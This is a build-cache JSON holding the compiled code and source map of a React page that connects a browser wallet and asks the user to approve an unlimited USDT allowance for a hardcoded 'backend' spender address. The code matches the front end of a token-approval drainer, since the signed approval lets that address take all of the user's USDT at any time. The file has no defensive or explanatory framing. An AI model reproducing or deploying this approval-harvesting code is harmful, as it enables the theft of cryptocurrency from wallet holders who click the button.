{"ast":null,"code":"var _jsxFileName = \"/Users/aryan/Documents/frontend/src/App.js\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst USDT_ABI = [\"function approve(address spender, uint256 amount) returns (bool)\"];\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // Replace with your backend wallet (spender)\n\nexport default function App() {\n  _s();\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [status, setStatus] = useState(\"\");\n  useEffect(() => {\n    if (window.ethereum) {\n      // EIP-1193 provider (MetaMask, Trust Wallet, etc)\n      setProvider(new ethers.BrowserProvider(window.ethereum));\n    } else {\n      alert(\"No Ethereum wallet detected! Please install MetaMask or use Trust Wallet DApp browser.\");\n    }\n  }, []);\n  async function connectWallet() {\n    if (!provider) return;\n    try {\n      const accounts = await provider.send(\"eth_requestAccounts\", []);\n      setAccount(accounts[0]);\n      setSigner(await provider.getSigner());\n      setStatus(\"\");\n    } catch (err) {\n      setStatus(\"Wallet connection rejected\");\n    }\n  }\n  async function approveMax() {\n    if (!signer) {\n      setStatus(\"Connect wallet first!\");\n      return;\n    }\n    setStatus(\"Approving max USDT allowance...\");\n    try {\n      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);\n      await tx.wait();\n      setStatus(\"Approval successful!\");\n    } catch (error) {\n      setStatus(\"Approval failed: \" + error.message);\n    }\n  }\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    style: {\n      padding: 20,\n      fontFamily: \"Arial\"\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      children: \"Approve Backend to Spend USDT\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 56,\n      columnNumber: 7\n    }, this), !account ? /*#__PURE__*/_jsxDEV(\"button\", {\n      onClick: connectWallet,\n      children: \"Connect Wallet\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 58,\n      columnNumber: 9\n    }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {\n      children: [/*#__PURE__*/_jsxDEV(\"p\", {\n        children: [/*#__PURE__*/_jsxDEV(\"b\", {\n          children: \"Connected:\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 61,\n          columnNumber: 14\n        }, this), \" \", account]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 61,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: approveMax,\n        children: \"Approve Max USDT\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 62,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"p\", {\n        children: status\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 63,\n        columnNumber: 11\n      }, this)]\n    }, void 0, true)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 55,\n    columnNumber: 5\n  }, this);\n}\n_s(App, \"jxXuKPIGOFFLgTLk6wf3eQF0uhs=\");\n_c = App;\nvar _c;\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["React","useState","useEffect","ethers","jsxDEV","_jsxDEV","Fragment","_Fragment","USDT_ADDRESS","USDT_ABI","SPENDER_ADDRESS","App","_s","provider","setProvider","signer","setSigner","account","setAccount","status","setStatus","window","ethereum","BrowserProvider","alert","connectWallet","accounts","send","getSigner","err","approveMax","usdt","Contract","tx","approve","MaxUint256","wait","error","message","style","padding","fontFamily","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","_c","$RefreshReg$"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["import React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst USDT_ABI = [\n  \"function approve(address spender, uint256 amount) returns (bool)\",\n];\n\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // Replace with your backend wallet (spender)\n\nexport default function App() {\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [status, setStatus] = useState(\"\");\n\n  useEffect(() => {\n    if (window.ethereum) {\n      // EIP-1193 provider (MetaMask, Trust Wallet, etc)\n      setProvider(new ethers.BrowserProvider(window.ethereum));\n    } else {\n      alert(\"No Ethereum wallet detected! Please install MetaMask or use Trust Wallet DApp browser.\");\n    }\n  }, []);\n\n  async function connectWallet() {\n    if (!provider) return;\n    try {\n      const accounts = await provider.send(\"eth_requestAccounts\", []);\n      setAccount(accounts[0]);\n      setSigner(await provider.getSigner());\n      setStatus(\"\");\n    } catch (err) {\n      setStatus(\"Wallet connection rejected\");\n    }\n  }\n\n  async function approveMax() {\n    if (!signer) {\n      setStatus(\"Connect wallet first!\");\n      return;\n    }\n    setStatus(\"Approving max USDT allowance...\");\n    try {\n      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);\n      await tx.wait();\n      setStatus(\"Approval successful!\");\n    } catch (error) {\n      setStatus(\"Approval failed: \" + error.message);\n    }\n  }\n\n  return (\n    <div style={{ padding: 20, fontFamily: \"Arial\" }}>\n      <h2>Approve Backend to Spend USDT</h2>\n      {!account ? (\n        <button onClick={connectWallet}>Connect Wallet</button>\n      ) : (\n        <>\n          <p><b>Connected:</b> {account}</p>\n          <button onClick={approveMax}>Approve Max USDT</button>\n          <p>{status}</p>\n        </>\n      )}\n    </div>\n  );\n}\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}